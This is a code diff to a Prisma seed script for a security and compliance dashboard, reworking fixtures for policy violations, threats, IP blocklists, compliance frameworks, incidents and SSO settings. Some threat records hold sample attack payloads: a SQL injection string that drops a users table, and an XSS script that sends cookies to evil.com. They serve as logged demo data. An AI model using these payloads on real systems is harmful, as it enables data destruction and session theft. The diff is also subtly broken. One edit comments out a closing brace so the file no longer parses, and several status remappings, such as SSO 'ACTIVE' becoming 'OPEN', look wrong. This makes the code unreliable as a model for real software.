         userId: sarahEnterprise.id,
-        violationType: 'UNTRUSTED_DEVICE',
-        severity: 'MEDIUM',
-        status: 'PENDING_REVIEW',
+        violationType: 'DEVICE_NOT_COMPLIANT',
+        severity: 'WARNING',
+        status: 'OPEN',
         description: 'Login attempt from unregistered device',
         details: { deviceType: 'Android', deviceId: 'unknown', osVersion: '11' },
-        detectedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
       },
       {
         policyId: apiAccessPolicy.id,
         orgId: techStartup.id,
         violationType: 'RATE_LIMIT_EXCEEDED',
-        severity: 'LOW',
-        status: 'AUTO_RESOLVED',
+        severity: 'INFO',
+        status: 'RESOLVED',
         description: 'API rate limit exceeded by 250%',
         details: { limit: 1000, actual: 2500, endpoint: '/api/v1/audiences', apiKeyPrefix: 'gwi_live_' },
-        detectedAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
         resolvedAt: new Date(now.getTime() - 6 * 60 * 60 * 1000 + 60000),
         resolution: 'Rate limit enforced, requests throttled',
       },
       {
         policyId: passwordPolicy.id,
         orgId: enterpriseCo.id,
-        violationType: 'PASSWORD_REUSE',
-        severity: 'MEDIUM',
+        violationType: 'WEAK_PASSWORD',
+        severity: 'WARNING',
         status: 'RESOLVED',
         description: 'User attempted to reuse a previous password',
         details: { passwordHistoryMatch: 3 },
-        detectedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
         resolvedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 120000),
         resolution: 'User selected new unique password',
       },
@@ -5438,23 +5471,23 @@ async function main() {
         policyId: dataAccessPolicy.id,
         orgId: acmeCorp.id,
         userId: johnDoe.id,
-        violationType: 'UNAUTHORIZED_DATA_ACCESS',
-        severity: 'HIGH',
-        status: 'INVESTIGATING',
+        violationType: 'UNAUTHORIZED_ACCESS',
+        severity: 'CRITICAL',
+        status: 'OPEN',
         description: 'Attempted access to restricted classification data without approval',
         details: { datasetId: 'ds_confidential_001', classification: 'restricted', requiredApproval: true },
-        detectedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
       },
       {
         policyId: mfaPolicy.id,
         orgId: acmeCorp.id,
         userId: janeSmith.id,
-        violationType: 'MFA_NOT_ENROLLED',
-        severity: 'MEDIUM',
+        violationType: 'FAILED_MFA',
+        severity: 'WARNING',
         status: 'RESOLVED',
         description: 'User attempted login without completing MFA enrollment during grace period',
         details: { gracePeriodExpired: true, enrollmentReminders: 3 },
-        detectedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
         resolvedAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
         resolution: 'User completed MFA enrollment',
       },
@@ -5462,12 +5495,12 @@ async function main() {
         policyId: sessionPolicy.id,
         orgId: techStartup.id,
         userId: bobWilson.id,
-        violationType: 'CONCURRENT_SESSION_LIMIT',
-        severity: 'LOW',
-        status: 'AUTO_RESOLVED',
+        violationType: 'SESSION_VIOLATION',
+        severity: 'INFO',
+        status: 'RESOLVED',
         description: 'User exceeded maximum concurrent sessions',
         details: { maxSessions: 3, activeSessions: 5, oldestSessionTerminated: true },
-        detectedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
         resolvedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 1000),
         resolution: 'Oldest sessions automatically terminated',
       },
@@ -5475,46 +5508,46 @@ async function main() {
         policyId: dlpPolicy.id,
         orgId: enterpriseCo.id,
         userId: sarahEnterprise.id,
-        violationType: 'SENSITIVE_DATA_IN_EXPORT',
-        severity: 'HIGH',
-        status: 'BLOCKED',
+        violationType: 'DATA_EXFILTRATION',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
         description: 'Export blocked due to credit card numbers detected in dataset',
         details: { creditCardsFound: 145, exportBlocked: true, sanitizedExportOffered: true },
-        detectedAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
         resolution: 'Export blocked, user offered sanitized version',
       },
       {
         policyId: ipAllowlistPolicy.id,
         orgId: enterpriseCo.id,
-        violationType: 'TOR_EXIT_NODE',
-        severity: 'HIGH',
-        status: 'BLOCKED',
+        violationType: 'IP_BLOCKED',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
         description: 'Connection attempt from known Tor exit node',
-        details: { sourceIP: '185.220.100.252', isTorExitNode: true },
-        detectedAt: new Date(now.getTime() - 18 * 60 * 60 * 1000),
+        details: { source: '185.220.100.252', isTorExitNode: true },
+        createdAt: new Date(now.getTime() - 18 * 60 * 60 * 1000),
         resolution: 'Connection automatically blocked',
       },
       {
         policyId: deviceTrustPolicy.id,
         orgId: acmeCorp.id,
         userId: adminUser.id,
-        violationType: 'JAILBROKEN_DEVICE',
-        severity: 'HIGH',
-        status: 'BLOCKED',
+        violationType: 'DEVICE_NOT_COMPLIANT',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
         description: 'Login attempt from jailbroken iOS device',
         details: { deviceType: 'iPhone', isJailbroken: true, detection: 'Cydia detected' },
-        detectedAt: new Date(now.getTime() - 20 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 20 * 60 * 60 * 1000),
         resolution: 'Access denied, user notified to use compliant device',
       },
       {
         policyId: apiAccessPolicy.id,
         orgId: acmeCorp.id,
-        violationType: 'INVALID_API_KEY',
-        severity: 'MEDIUM',
-        status: 'LOGGED',
+        violationType: 'API_ABUSE',
+        severity: 'WARNING',
+        status: 'OPEN',
         description: 'Multiple requests with invalid or expired API key',
         details: { keyPrefix: 'gwi_test_old_', attempts: 50, timeWindow: '5 minutes' },
-        detectedAt: new Date(now.getTime() - 30 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 30 * 60 * 60 * 1000),
         resolution: 'Requests rejected, key owner notified',
       },
     ]
@@ -5527,142 +5560,134 @@ async function main() {
     data: [
       {
         type: 'BRUTE_FORCE',
-        severity: 'HIGH',
+        severity: 'CRITICAL',
         status: 'MITIGATED',
-        sourceIP: '45.33.32.156',
-        targetResource: 'login_endpoint',
+        source: '45.33.32.156',
         description: 'Brute force attack detected against login endpoint',
         details: { attempts: 5000, uniqueUsernames: 150, timeWindow: '1 hour', blocked: true },
-        detectedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 300000),
-        mitigationAction: 'IP blocked for 24 hours, affected accounts locked',
+        mitigation: 'IP blocked for 24 hours, affected accounts locked',
       },
       {
         type: 'PHISHING_ATTEMPT',
         severity: 'CRITICAL',
-        status: 'INVESTIGATING',
-        targetResource: 'user_accounts',
-        targetOrgId: acmeCorp.id,
+        status: 'OPEN',
+        source: 'phishing_campaign',
+        orgId: acmeCorp.id,
         description: 'Phishing campaign targeting organization users detected',
         details: { affectedUsers: 12, phishingDomain: 'gwi-login.fake.com', reportedBy: 'user' },
-        detectedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
       },
       {
         type: 'SUSPICIOUS_ACTIVITY',
-        severity: 'MEDIUM',
-        status: 'MONITORING',
-        sourceIP: '103.21.244.0',
-        targetResource: 'api_endpoints',
-        targetOrgId: techStartup.id,
+        severity: 'WARNING',
+        status: 'CONTAINED',
+        source: '103.21.244.0',
+        orgId: techStartup.id,
         description: 'Unusual API access patterns detected',
         details: { pattern: 'sequential_enumeration', endpoints: ['/users', '/orgs', '/data'], requests: 10000 },
-        detectedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
       },
       {
         type: 'CREDENTIAL_STUFFING',
-        severity: 'HIGH',
+        severity: 'CRITICAL',
         status: 'MITIGATED',
-        sourceIP: '185.220.101.1',
-        targetResource: 'authentication',
+        source: '185.220.101.1',
         description: 'Credential stuffing attack using leaked credentials database',
         details: { totalAttempts: 25000, successfulLogins: 3, leakSource: 'unknown_breach' },
-        detectedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 1800000),
-        mitigationAction: 'Compromised accounts locked, password reset required',
+        mitigation: 'Compromised accounts locked, password reset required',
       },
       {
-        type: 'SQL_INJECTION',
+        type: 'SUSPICIOUS_ACTIVITY',
         severity: 'CRITICAL',
-        status: 'BLOCKED',
-        sourceIP: '198.51.100.42',
-        targetResource: 'search_api',
+        status: 'RESOLVED',
+        source: '198.51.100.42',
         description: 'SQL injection attempt in search query parameter',
         details: { payload: "'; DROP TABLE users; --", endpoint: '/api/search', blocked: true },
-        detectedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 100),
-        mitigationAction: 'Request blocked by WAF, IP added to blocklist',
+        mitigation: 'Request blocked by WAF, IP added to blocklist',
       },
       {
-        type: 'XSS_ATTEMPT',
-        severity: 'HIGH',
-        status: 'BLOCKED',
-        sourceIP: '203.0.113.50',
-        targetResource: 'comment_field',
+        type: 'SUSPICIOUS_ACTIVITY',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
+        source: '203.0.113.50',
         description: 'Cross-site scripting attempt in user input field',
         details: { payload: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', sanitized: true },
-        detectedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000 + 50),
-        mitigationAction: 'Input sanitized, attempt logged',
+        mitigation: 'Input sanitized, attempt logged',
       },
       {
-        type: 'DATA_SCRAPING',
-        severity: 'MEDIUM',
+        type: 'API_ABUSE',
+        severity: 'WARNING',
         status: 'MITIGATED',
-        sourceIP: '104.18.32.7',
-        targetResource: 'public_api',
-        targetOrgId: enterpriseCo.id,
+        source: '104.18.32.7',
+        orgId: enterpriseCo.id,
         description: 'Automated data scraping detected via API',
         details: { requestsPerMinute: 500, dataExtracted: '50MB', duration: '2 hours' },
-        detectedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000 + 7200000),
-        mitigationAction: 'Rate limiting applied, API key revoked',
+        mitigation: 'Rate limiting applied, API key revoked',
       },
       {
         type: 'ACCOUNT_TAKEOVER',
         severity: 'CRITICAL',
         status: 'RESOLVED',
-        targetResource: 'user_account',
-        targetOrgId: acmeCorp.id,
-        targetUserId: johnDoe.id,
+        source: 'suspicious_login',
+        orgId: acmeCorp.id,
+        userId: johnDoe.id,
         description: 'Successful account takeover detected and reversed',
         details: { loginLocation: 'Nigeria', normalLocation: 'United States', actionsPerformed: ['password_change', 'email_change'] },
-        detectedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 3600000),
-        mitigationAction: 'Account recovered, all sessions terminated, credentials reset',
+        mitigation: 'Account recovered, all sessions terminated, credentials reset',
       },
       {
         type: 'API_ABUSE',
-        severity: 'MEDIUM',
-        status: 'MONITORING',
-        sourceIP: '172.217.14.110',
-        targetResource: 'reporting_api',
+        severity: 'WARNING',
+        status: 'CONTAINED',
+        source: '172.217.14.110',
         description: 'Excessive API usage beyond normal patterns',
         details: { normalUsage: 100, currentUsage: 5000, increase: '5000%' },
-        detectedAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
       },
       {
         type: 'INSIDER_THREAT',
-        severity: 'HIGH',
-        status: 'INVESTIGATING',
-        targetResource: 'sensitive_data',
-        targetOrgId: enterpriseCo.id,
-        targetUserId: sarahEnterprise.id,
+        severity: 'CRITICAL',
+        status: 'OPEN',
+        source: 'internal_system',
+        orgId: enterpriseCo.id,
+        userId: sarahEnterprise.id,
         description: 'Unusual data access pattern by privileged user',
         details: { normalAccessVolume: '10 records/day', currentAccess: '5000 records', dataType: 'customer_pii' },
-        detectedAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
       },
       {
         type: 'MALWARE_DETECTED',
         severity: 'CRITICAL',
-        status: 'BLOCKED',
-        targetResource: 'file_upload',
+        status: 'RESOLVED',
+        source: 'file_scanner',
         description: 'Malware detected in uploaded file',
         details: { fileName: 'report.xlsx.exe', malwareType: 'Trojan.Generic', scanner: 'ClamAV' },
-        detectedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 500),
-        mitigationAction: 'File quarantined, upload rejected',
+        mitigation: 'File quarantined, upload rejected',
       },
       {
-        type: 'DDOS_ATTACK',
+        type: 'DDOS_ATTEMPT',
         severity: 'CRITICAL',
         status: 'MITIGATED',
-        sourceIP: 'multiple',
-        targetResource: 'platform',
+        source: 'multiple',
         description: 'Distributed denial of service attack on platform',
         details: { peakTraffic: '50 Gbps', duration: '45 minutes', botnetSize: 'estimated 100k nodes' },
-        detectedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        createdAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
         mitigatedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000 + 2700000),
-        mitigationAction: 'Traffic rerouted through DDoS protection, attack absorbed',
+        mitigation: 'Traffic rerouted through DDoS protection, attack absorbed',
       },
     ]
   })
@@ -5674,61 +5699,51 @@ async function main() {
     data: [
       {
         ipAddress: '45.33.32.156',
-        blockType: 'PERMANENT',
+        type: 'BRUTE_FORCE',
         reason: 'Repeated brute force attacks and credential stuffing attempts',
-        source: 'AUTOMATIC',
-        threatScore: 95,
         metadata: { attacks: 15, lastAttack: now.toISOString(), country: 'Unknown' },
       },
       {
         ipAddress: '185.220.100.0/24',
-        blockType: 'PERMANENT',
+        ipRange: '185.220.100.0/24',
+        type: 'THREAT_INTEL',
         reason: 'Known Tor exit node range',
-        source: 'THREAT_INTEL',
-        threatScore: 80,
-        metadata: { category: 'tor_exit_nodes', provider: 'TorProject' },
+        metadata: { // category: 'tor_exit_nodes', provider: 'TorProject' },
       },
       {
-        ipAddress: '103.21.244.0/24',
-        blockType: 'TEMPORARY',
+        ipAddress: '103.21.244.0',
+        ipRange: '103.21.244.0/24',
+        type: 'AUTOMATIC',
         reason: 'Suspicious scanning activity detected',
-        source: 'AUTOMATIC',
         expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
-        threatScore: 65,
         metadata: { scannedPorts: [22, 80, 443, 3306, 5432], scanDuration: '2 hours' },
       },
       {
         ipAddress: '198.51.100.42',
-        blockType: 'PERMANENT',
+        type: 'AUTOMATIC',
         reason: 'SQL injection attacks',
-        source: 'AUTOMATIC',
-        threatScore: 90,
         metadata: { attackType: 'sql_injection', attempts: 50 },
       },
       {
-        ipAddress: '223.5.5.0/24',
-        blockType: 'GEO_BLOCK',
+        ipAddress: '223.5.5.0',
+        ipRange: '223.5.5.0/24',
+        type: 'GEOGRAPHIC',
         reason: 'Geographic restriction - China',
-        source: 'MANUAL',
-        threatScore: 50,
         metadata: { country: 'CN', reason: 'compliance_requirement' },
       },
       {
         ipAddress: '203.0.113.50',
-        blockType: 'TEMPORARY',
+        type: 'AUTOMATIC',
         reason: 'XSS attack attempts',
-        source: 'AUTOMATIC',
         expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
-        threatScore: 75,
         metadata: { attackType: 'xss', blocked: true },
       },
       {
-        ipAddress: '104.18.32.0/24',
-        blockType: 'RATE_LIMITED',
+        ipAddress: '104.18.32.0',
+        ipRange: '104.18.32.0/24',
+        type: 'AUTOMATIC',
         reason: 'Excessive API requests - possible scraping',
-        source: 'AUTOMATIC',
         expiresAt: new Date(now.getTime() + 24 * 60 * 60 * 1000),
-        threatScore: 45,
         metadata: { requestsPerMinute: 500, limit: 100 },
       },
     ]
@@ -5743,7 +5758,7 @@ async function main() {
       code: 'SOC2',
       description: 'Service Organization Control 2 - Trust Services Criteria for Security, Availability, and Confidentiality',
       version: '2017',
-      category: 'SECURITY',
+      // category: 'SECURITY',
       requirements: [
         { id: 'CC1.1', name: 'Control Environment', description: 'Management philosophy and operating style' },
         { id: 'CC2.1', name: 'Communication and Information', description: 'Quality information and internal communication' },
@@ -5762,7 +5777,7 @@ async function main() {
         { id: 'CC8.1.1', requirement: 'CC8.1', name: 'Change Approval Process', implemented: true },
       ],
       isActive: true,
-      effectiveDate: new Date('2024-01-01'),
+      // effectiveDate: new Date('2024-01-01'),
     }
   })
 
@@ -5772,7 +5787,7 @@ async function main() {
       code: 'HIPAA',
       description: 'Health Insurance Portability and Accountability Act - Privacy and Security Rules',
       version: '2013',
-      category: 'PRIVACY',
+      // category: 'PRIVACY',
       requirements: [
         { id: '164.308', name: 'Administrative Safeguards', description: 'Security management and workforce security' },
         { id: '164.310', name: 'Physical Safeguards', description: 'Facility access and device security' },
@@ -5787,7 +5802,7 @@ async function main() {
         { id: '164.312.e1', requirement: '164.312', name: 'Encryption', implemented: true },
       ],
       isActive: true,
-      effectiveDate: new Date('2024-01-01'),
+      // effectiveDate: new Date('2024-01-01'),
     }
   })
 
@@ -5797,7 +5812,7 @@ async function main() {
       code: 'GDPR',
       description: 'General Data Protection Regulation - EU Data Protection Law',
       version: '2018',
-      category: 'PRIVACY',
+      // category: 'PRIVACY',
       requirements: [
         { id: 'Art5', name: 'Principles of Processing', description: 'Lawfulness, fairness, transparency' },
         { id: 'Art6', name: 'Lawful Basis', description: 'Legal grounds for processing' },
@@ -5815,7 +5830,7 @@ async function main() {
         { id: 'Art25.1', requirement: 'Art25', name: 'Privacy by Design', implemented: true },
       ],
       isActive: true,
-      effectiveDate: new Date('2024-01-01'),
+      // effectiveDate: new Date('2024-01-01'),
     }
   })
 
@@ -5825,7 +5840,7 @@ async function main() {
       code: 'ISO27001',
       description: 'Information Security Management System Standard',
       version: '2022',
-      category: 'SECURITY',
+      // category: 'SECURITY',
       requirements: [
         { id: 'A.5', name: 'Organizational Controls', description: 'Policies, roles, responsibilities' },
         { id: 'A.6', name: 'People Controls', description: 'Screening, awareness, responsibilities' },
@@ -5839,7 +5854,7 @@ async function main() {
         { id: 'A.8.24', requirement: 'A.8', name: 'Use of Cryptography', implemented: true },
       ],
       isActive: true,
-      effectiveDate: new Date('2024-01-01'),
+      // effectiveDate: new Date('2024-01-01'),
     }
   })
 
@@ -5849,7 +5864,7 @@ async function main() {
       code: 'PCI-DSS',
       description: 'Payment Card Industry Data Security Standard',
       version: '4.0',
-      category: 'DATA_SECURITY',
+      // category: 'DATA_SECURITY',
       requirements: [
         { id: 'Req1', name: 'Network Security Controls', description: 'Firewall and network security' },
         { id: 'Req2', name: 'Secure Configurations', description: 'Vendor default security parameters' },
@@ -5870,7 +5885,7 @@ async function main() {
         { id: 'Req10.2', requirement: 'Req10', name: 'Audit Trail Implementation', implemented: true },
       ],
       isActive: false,
-      effectiveDate: new Date('2024-03-31'),
+      // effectiveDate: new Date('2024-03-31'),
     }
   })
 
@@ -5911,7 +5926,7 @@ async function main() {
       {
         frameworkId: hipaaFramework.id,
         orgId: enterpriseCo.id,
-        status: 'PENDING_REVIEW',
+        status: 'OPEN',
         attestedBy: 'KPMG',
         findings: [
           { type: 'finding', area: '164.312', description: 'Encryption key rotation policy needs update', severity: 'medium' },
@@ -6015,7 +6030,7 @@ async function main() {
     data: {
       name: 'Smith v. DataCorp Litigation',
       description: 'Legal hold for all documents related to Smith v. DataCorp class action lawsuit regarding data privacy',
-      status: 'ACTIVE',
+      status: 'OPEN',
       reason: 'Pending litigation - class action lawsuit',
       caseReference: 'Case No. 2024-CV-12345',
       custodians: [johnDoe.id, janeSmith.id, adminUser.id],
@@ -6038,7 +6053,7 @@ async function main() {
     data: {
       name: 'Regulatory Investigation - FTC',
       description: 'Document preservation for FTC investigation into data practices',
-      status: 'ACTIVE',
+      status: 'OPEN',
       reason: 'Regulatory investigation',
       caseReference: 'FTC File No. 2024-INV-789',
       custodians: [adminUser.id, sarahEnterprise.id],
@@ -6202,7 +6217,7 @@ async function main() {
         description: 'Retain user activity logs for compliance and security analysis',
         scope: { logTypes: ['login', 'api_access', 'data_view', 'export'] },
         deletionMethod: 'HARD_DELETE',
-        isEnabled: true,
+        isActive: true,
         lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
         nextExecution: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
         legalBasis: 'Legitimate interest - security monitoring',
@@ -6215,7 +6230,7 @@ async function main() {
         scope: { logTypes: ['admin_actions', 'data_changes', 'access_control'] },
         deletionMethod: 'ARCHIVE',
         archiveLocation: 's3://gwi-compliance-archive/audit-logs/',
-        isEnabled: true,
+        isActive: true,
         lastExecuted: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
         nextExecution: new Date(now.getTime() + 23 * 24 * 60 * 60 * 1000),
         legalBasis: 'Legal obligation - SOX compliance',
@@ -6227,7 +6242,7 @@ async function main() {
         description: 'Retain customer analytics data for 2 years',
         scope: { dataTypes: ['surveys', 'responses', 'insights'] },
         deletionMethod: 'ANONYMIZE',
-        isEnabled: true,
+        isActive: true,
         lastExecuted: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
         nextExecution: new Date(now.getTime() + 16 * 24 * 60 * 60 * 1000),
         legalBasis: 'Contract performance',
@@ -6239,7 +6254,7 @@ async function main() {
         description: 'Short-term retention for session data',
         scope: { dataTypes: ['session_tokens', 'temp_files', 'cache'] },
         deletionMethod: 'HARD_DELETE',
-        isEnabled: true,
+        isActive: true,
         lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
         nextExecution: new Date(now.getTime() + 1 * 24 * 60 * 60 * 1000),
         legalBasis: 'Data minimization',
@@ -6251,7 +6266,7 @@ async function main() {
         description: 'Retain marketing consent records for 3 years after last interaction',
         scope: { dataTypes: ['consent_records', 'preferences', 'opt_outs'] },
         deletionMethod: 'SOFT_DELETE',
-        isEnabled: true,
+        isActive: true,
         legalBasis: 'Consent - GDPR Art. 7',
       },
       {
@@ -6261,7 +6276,7 @@ async function main() {
         description: 'Grace period for deleted accounts before permanent removal',
         scope: { dataTypes: ['profile', 'settings', 'connections'] },
         deletionMethod: 'STAGED_DELETE',
-        isEnabled: true,
+        isActive: true,
         lastExecuted: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
         nextExecution: new Date(now.getTime() + 4 * 24 * 60 * 60 * 1000),
         legalBasis: 'User request - GDPR Art. 17',
@@ -6311,7 +6326,7 @@ async function main() {
       title: 'Data Export Service Degradation',
       description: 'Large data exports timing out. Exports over 100MB failing consistently.',
       severity: 'MINOR',
-      status: 'MONITORING',
+      status: 'CONTAINED',
       affectedServices: ['Data Export', 'Report Generation'],
       startedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
       impactSummary: { affectedExports: 23, workaround: 'Split exports into smaller chunks' },
@@ -6351,7 +6366,7 @@ async function main() {
       title: 'Webhook Delivery Backlog',
       description: 'Webhook deliveries delayed by up to 30 minutes due to queue backlog.',
       severity: 'MAJOR',
-      status: 'INVESTIGATING',
+      status: 'OPEN',
       affectedServices: ['Webhook Service', 'Event Processing'],
       startedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
       impactSummary: { delayedWebhooks: 15000, maxDelay: '30 minutes' },
@@ -6363,16 +6378,16 @@ async function main() {
 
   await prisma.incidentUpdate.createMany({
     data: [
-      { incidentId: incident1.id, status: 'INVESTIGATING', message: 'We are investigating reports of elevated API latency.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000) },
+      { incidentId: incident1.id, status: 'OPEN', message: 'We are investigating reports of elevated API latency.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000) },
       { incidentId: incident1.id, status: 'IDENTIFIED', message: 'Root cause identified as database connection pool exhaustion. Working on mitigation.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 30 * 60 * 1000) },
-      { incidentId: incident1.id, status: 'MONITORING', message: 'Fix deployed. Monitoring for stability.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 90 * 60 * 1000) },
+      { incidentId: incident1.id, status: 'CONTAINED', message: 'Fix deployed. Monitoring for stability.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 90 * 60 * 1000) },
       { incidentId: incident1.id, status: 'RESOLVED', message: 'Incident resolved. All systems operating normally. Full postmortem to follow.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000) },
-      { incidentId: incident2.id, status: 'INVESTIGATING', message: 'We are aware of login issues affecting some users and are investigating.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000) },
+      { incidentId: incident2.id, status: 'OPEN', message: 'We are aware of login issues affecting some users and are investigating.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000) },
       { incidentId: incident2.id, status: 'IDENTIFIED', message: 'Issue traced to Redis cluster. Implementing fix.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 20 * 60 * 1000) },
       { incidentId: incident2.id, status: 'RESOLVED', message: 'Authentication service restored. All users should be able to log in normally.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000) },
-      { incidentId: incident3.id, status: 'INVESTIGATING', message: 'We are investigating reports of export timeouts for large datasets.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
+      { incidentId: incident3.id, status: 'OPEN', message: 'We are investigating reports of export timeouts for large datasets.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
       { incidentId: incident3.id, status: 'IDENTIFIED', message: 'Issue identified. Workaround: Please split exports into chunks smaller than 100MB while we work on a fix.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 10 * 60 * 60 * 1000) },
-      { incidentId: incident6.id, status: 'INVESTIGATING', message: 'We are investigating delayed webhook deliveries.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
+      { incidentId: incident6.id, status: 'OPEN', message: 'We are investigating delayed webhook deliveries.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
       { incidentId: incident6.id, status: 'IDENTIFIED', message: 'Queue backlog identified. Scaling up workers to process backlog.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 60 * 60 * 1000) },
     ]
   })
@@ -6676,7 +6691,7 @@ async function main() {
       {
         orgId: enterpriseCo.id,
         provider: 'OKTA',
-        status: 'ACTIVE',
+        status: 'OPEN',
         config: {
           issuer: 'https://enterprise-co.okta.com',
           clientId: 'okta_client_12345',
@@ -6702,7 +6717,7 @@ async function main() {
       {
         orgId: acmeCorp.id,
         provider: 'AZURE_AD',
-        status: 'ACTIVE',
+        status: 'OPEN',
         config: {
           tenantId: 'acme-tenant-uuid',
           clientId: 'azure_client_67890',
@@ -6766,7 +6781,7 @@ async function main() {
       {
         orgId: enterpriseCo.id,
         provider: 'OKTA',
-        status: 'ACTIVE',
+        status: 'OPEN',
         endpoint: 'https://api.gwi.com/scim/v2/enterprise-co',
         bearerToken: 'scim_token_encrypted_abc123',
         config: {
@@ -6784,7 +6799,7 @@ async function main() {
       {
         orgId: acmeCorp.id,
         provider: 'AZURE_AD',
-        status: 'ACTIVE',
+        status: 'OPEN',
         endpoint: 'https://api.gwi.com/scim/v2/acme-corp',
         bearerToken: 'scim_token_encrypted_def456',
         config: {
@@ -6828,7 +6843,7 @@ async function main() {
       orgId: enterpriseCo.id,
       name: 'Enterprise Device Policy',
       description: 'Standard device requirements for enterprise organization access',
-      isEnabled: true,
+      isActive: true,
       requirements: {
         minOSVersions: { windows: '10.0.19041', macos: '12.0', ios: '15.0', android: '12' },
         requireEncryption: true,
@@ -6850,7 +6865,7 @@ async function main() {
       orgId: enterpriseCo.id,
       name: 'High Security Device Policy',
       description: 'Strict requirements for accessing sensitive data',
-      isEnabled: true,
+      isActive: true,
